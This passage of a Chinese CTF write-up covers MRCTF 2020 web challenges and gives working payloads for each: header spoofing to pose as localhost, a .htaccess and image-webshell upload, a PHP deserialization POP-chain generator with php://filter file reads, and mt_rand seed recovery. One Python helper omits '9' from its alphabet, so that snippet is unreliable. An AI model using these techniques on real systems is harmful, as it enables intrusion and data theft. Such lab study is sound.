class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure></div>

<p>用数组绕过md5，用数字+字符绕过is_numeric()+弱等于</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在源码里发现这段js，这题卡在md5好久。。淦，原来是不用解密的，就是个前端验证，而且还破解不出来md5的值</p>
<p>直接访问/flag.php</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>构造X-Forwarded-For: 127.0.0.1，得到flag</p>
<h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>服务器搁美国，给爷整傻了，本来题不是很难，这发包没响应给爷心态搞崩了，后来连上蚁剑后终于知道为啥网站卡了。。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>开题一看就知道是老祖安人了</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>先上传个解析图片为php的.htaccess文件，改一下Content-Type，再传个图片🐎</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后蚁剑连一下，得到flag</p>
<h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>第一次遇到反序列化构造pop链的题，还是入门晚了嗷，构造了好久还是不会利用类之间的关系，看了wp才恍然大悟。。</p>
<p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">一些函数</a></p>
<blockquote>
<ol>
<li>__construct()，类的构造函数</li>
<li>__destruct()，类的析构函数</li>
<li>__call()，在对象中调用一个不可访问方法时调用</li>
<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
<li>__get()，获得一个类的成员变量时调用</li>
<li>__set()，设置一个类的成员变量时调用</li>
<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
<li>__sleep()，执行serialize()时，先会调用这个函数</li>
<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>
<li>__toString()，类被当成字符串时的回应方法</li>
<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>
<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
<li>__clone()，当对象复制完成时调用</li>
<li>__autoload()，尝试加载未定义的类</li>
<li>__debugInfo()，打印所需调试信息</li>
</ol>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123; <span class="comment">//用函数调用Modifier时调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var); <span class="comment">//通过var实现文件包含</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;<span class="comment">//构造函数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="comment">//类被当成字符串时调用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;<span class="comment">//析构时调用</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123; <span class="comment">//获取Test类的成员变量</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function(); <span class="comment">//将变量P以函数执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>思路：反序列化时调用<code>__wakeup()</code>进行字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，则调用<code>__toString()</code>。</p>
<p><code>return $this-&gt;str-&gt;source;</code>会访问<code>str</code>的<code>source</code>属性，若<code>str</code>是<code>Test</code>类则不存在<code>source</code>属性，便调用了<code>__get()</code>。</p>
<p><code>__get</code>将<code>p</code>以函数执行，可以将<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法。</p>
<p>最后通过<code>var</code>来构造伪协议来读源码。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show(<span class="string">'abc'</span>);<span class="comment">//初始化一个Show类</span></span><br><span class="line">$a-&gt;str=<span class="keyword">new</span> Test();<span class="comment">//将str实例化为Test类，访问Test类source变量时调用__get()</span></span><br><span class="line">$b=<span class="keyword">new</span> Show($a);<span class="comment">//令$this-&gt;source等于Show类，类$a被当成字符串的形式执行，从而调用__toString()</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></div>

<p>base64解码后得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>简单Bypass、伪协议、jsfuck</p>
<p>F12发现以下源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></div>

<p>第一个验证把<code>_</code>和<code>%5f</code> ban了，可以用<code>空格</code>和 <code>.</code>来代替，第二个可以用换行污染<code>%0a</code>来绕过。得到提示：<code>FLAG is in secrettw.php</code>。</p>
<p>打开<code>secrettw.php</code>得到<code>But how to get it?Local access only!</code></p>
<p>源码中有jsfuck，解码得到：<code>post me Merak</code></p>
<p>post一个Merak参数，构造<code>Client-ip:127.0.0.1</code>，得到php代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123;  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123;  </span><br><span class="line">    $v = base64_decode($v);  </span><br><span class="line">    $re = <span class="string">''</span>;  </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;  </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> $re;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>; </span><br><span class="line">$ip = getIp(); </span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>) </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip; </span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]); </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>要求传入<code>2333</code>变量文件的内容为<code>todat is a happy day</code></p>
<p>可以用<code>php://input</code>或者<code>data://</code>伪协议绕过，<code>data://text/plain,todat is a happy day</code>。</p>
<p>且传入的<code>file</code>变量要经过<code>change</code>加密，所以传入一个加密的伪协议或者文件名进行文件包含。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    $rc=base64_encode($re);</span><br><span class="line">    <span class="keyword">return</span> $rc;</span><br><span class="line">&#125;</span><br><span class="line">$v=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="comment">//得到结果进行base64解码得到flag</span></span><br><span class="line"><span class="comment">//或者$v="flag.php";然后查看源码得到flag</span></span><br><span class="line">$a=rechange($v);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>源码泄露、伪随机数、基础SQL</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure></div>

<p>要求<code>$Private_key</code>，已知<code>$Public_key = KVQP0LdJKRaV3n9D</code>，并且它们都是<code>mt_rand()</code>生成的，所以用公钥去还原种子，用种子求出私钥即可。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;<span class="comment">//字母表</span></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678'</span></span><br><span class="line">str2 = <span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure></div>

<p>把上面的一串数字丢进<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_rand</a>爆破一下，得到种子：<code>1775196155</code>（注意php版本，5和7同样种子，生成不同</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/10.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/11.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = 